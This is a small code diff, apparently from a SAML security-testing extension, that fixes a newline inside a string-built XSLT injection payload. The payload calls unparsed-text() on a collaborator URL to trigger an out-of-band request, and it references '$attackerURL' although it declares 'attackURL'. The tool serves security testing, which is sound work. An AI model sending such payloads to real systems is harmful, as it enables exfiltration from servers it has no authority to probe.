@@ -628,7 +628,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 				"  <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
 				"    <xsl:template match=\"doc\">\n" +
 				"      <xsl:variable name=\"file\" select=\"'test'\"/>\n" +
-				"      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>" +
+				"      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>\n" +
 				"      <xsl:variable name=\"attackURL\" select=\"'" + collabUrl + "'\"/>\n" +
 				"      <xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" +
 				"      <xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" +
